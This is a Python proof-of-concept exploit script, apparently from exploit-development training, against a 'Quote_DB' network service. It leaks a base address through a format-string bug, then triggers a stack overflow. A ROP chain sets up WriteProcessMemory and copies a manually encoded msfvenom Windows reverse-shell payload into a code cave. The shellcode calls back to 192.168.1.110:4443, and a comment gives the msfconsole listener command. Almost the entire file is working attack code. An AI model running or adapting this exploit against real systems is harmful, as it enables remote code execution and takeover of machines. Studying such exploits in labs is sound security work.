#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# Bad Characters: "\x00\x0a\x20\x80\x81\x86"
# Custom Encode Mapping:
# \x00 -> \xff

# Manually Encoded Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110 LPORT=4443 -f python -v shellcode
shellcode =  b""
shellcode += b"\x90" * 8
shellcode += b"\xfc\xe8\x82\xff\xff\xff\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shellcode += b"\x6a\x05\x68\xc0\xa8\x01\x6e\x68\x02\x00\x11"
shellcode += b"\x5b\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
shellcode += b"\x6a\x00\x53\xff\xd5"

# Encoded Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110LPORT=4443 -b "\x00\x0a\x20\x80\x81\x86" EXITFUNC=thread -f python -v shellcode
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD payload/windows/shell_reverse_tcp; set LHOST 192.168.1.110; set lport 4443; exploit"

# ===

rop_wpm = [
# 1. Get ESP (in eax)
    0x402ac9,       # xor eax, eax ; ret
                    # Sets EAX to 0

    0x401fd6,       # or eax, esp ; ret
                    # Sets EAX to the value of ESP

                    # Results: EAX contains the value of stack pointer (ESP)

# 2. Get skeleton call addr (in ebx)
    0x4040f3,       # pop ecx ; ret
                    # EAX has the value of saved ESP.
    0x1ec,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (0x61616161)


    0x40eb7d,       # mov edx, eax ; mov edx, eax ; ret
                    # Moves EAX(ESP) to EDX.
                    # Reason: To add ECX to EDX to manipulate saved ESP

    0x401ff3,       # add edx, ecx ; ret
    0x402ce8,       # mov eax, edx
                    # Return saved ESP in EDX to EAX

    0x401fe0,       # mov ebx, eax ; ret
                    # Saved ESP is now in EBX also.

# 3. Deref WriteProcessMemory (in eax)
    0x4030d7,       # pop eax ; pop ecx ; ret
                    # Place VirtualAlloc into EAX
    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x77932510 KERNEL32!WriteProcessMemoryStub
    0xffffffff,     # junk for pop ecx

    0x410515,       # mov eax, [eax] ; ret
                    # Derefernces the address in EAX to get the actual function pointer
                    # of WriteProcessMemory.

                    # Before instruction: EAX contains 0x0044a1e8
                    # During instruction: CPU reads the value within 0x0044a1e8
                    # After  instruction: The value 0x75ac81b0 (KERNEL32!WriteProcessMemoryStub)
                    #                     is moved into the EAX register.

# 4. 0x61616161 Write WriteProcessMemory to skeleton + 0x0
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move WriteProcessMemory Pointer into EBX. (Skeleton location 0x61616161)

# 5. Get shellcode addr (in eax)
    0x4040f3,       # pop ecx ; ret
    0x1c,           # hex(28)

    0x401ff3,       # add edx, ecx ; ret
                    # Adds 0x18 to EDX (which contains original skeleton call)
                    # EDX now points to shellcode address parameter

    0x402ce8,       # mov eax, edx
                    # EDX moves shellcode address parameter address to EAX

                    # Result: EAX contains the address of the shellcode
                    #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)


# 8. 0x64646464 Get skeleton call addr + 0x10 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x10 (0x64646464)
                    #          Skipped 12 bytes because:
                    #          Ret Shellcode is done
                    #          hProcess is done (0xffffffff)
                    #          lpBaseAddress is done (0x00491d10)
                    #          (NO ASLR in main_dep_wpm.exe module)

# 9. Get skeleton call addr + 0x10 (in ebx)
    0x401fe7,       # mov [ebx], eax
                    # 0x011678e8 Shellcode Stack Address (src)


# 10. 0x64646464 Get skeleton call addr + 0x14
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x14 (0x66666666)


                    # All Skeleton values completed
                    # End   of ROP 1
                    # Start of ROP 2
                    # ROP 2 will encode the shellcode to replace bad characters
                    # bad characters: 0x00 0x0a 0x20 0x28 0x80 0x81 0x86

]
rop_wpm = b"".join([pack("<I", r) for r in rop_wpm])

# rop_decode decodes the shellcode using ROP gadgets.
# This is performed because metasploits shellcode tries to decode the shellcode
# whilst shellcode on RX (the Shellcode code cave address).
# It then crashes because you can't write on RX.
# 1. Encode the Shellcode manually to prevent bad characters breaking the exploit
# 2. Decode the shellcode manually to restore the bad characters using ROP, this works
#    because the shellcode is on the stack now and wasn't in the payload. If it was
#    passed in the payload the exploit would break. Example - "\x00" would break the payload.

rop_decode = [
# 10. Align EDX with the shellcode
#    0x4040f3,       # pop ecx
#    0x4,            # hex(100)
#    0x401ff3,       # add edx, ecx

# 11. Align EDX with "\xff\xff\xff" to restore the bad characters "\x00\x00\x00"
    0x4040f3,       # pop ecx
    0xb,            # hex(11)
    0x401ff3,       # add edx, ecx

# 12. Restore bad characters in EDX
#     a. Move memory address of shellcode in EDX to EAX
#     b. Pop EDX & place 0x60000000 into it
#     c. Move EDX (0x60000000) into [EAX] (Derefenced)
#     d. Move EAX address of shellcode
#        OR
#        use EAX for decoding shellcode

    0x402ce8,       # mov eax, edx ; ret
    0x401fde,       # pop edx
    0x60000000,     # fill edx
    0x40cc07,       # mov  [eax], edx ; ret
    0x40eb7d,       # mov edx, eax ; mov eax, edx ; ret
                    # Results:
                    #   Decoded successfully
                    #   0x60ffffff -> 0x60000000
                    #   1 step forward on returing the 'bad bytes'
                    #   for the Shellcode to work properly &
                    #   not break the exploit.

]
rop_decode = b"".join([pack("<I", r) for r in rop_decode])

rop_align = [
# #. Align esp with skeleton call (ebx-8)
    0x4040f3,       # pop ecx
    0xffffffd9,     # ffffffd9 (-39)
    0x401ff3,       # add edx, ecx  = edx - 0x24
    0x402ce8,       # mov eax, edx
    0x401fe0,       # mov ebx, eax
    0x401fe3,       # xchg ebx, esp ; dec ecx ; ret

                    # Results: Return SAVED ESP from EAX to CURRENT ESP

]
rop_align = b"".join([pack("<I", r) for r in rop_align])

# ===

skeleton  = b"aaaa"                # WriteProcessMemory     <- The Call
skeleton += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
skeleton += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
skeleton += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
skeleton += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
skeleton += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
skeleton += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address

# ===

buf  = b"A" * 2060
buf += rop_wpm                      # Setup WriteProcessMemory paramters
buf += rop_decode               # Decode Shellcode
buf += rop_align                     # Align ESP to skeleton call
buf += b"C" * (ropSize - len(rop_wpm) - len(rop_decode) - len(rop_align))
buf += skeleton
buf += shellcode

# ===

print("[+] Triggering overflow...")

bad_request(buf)
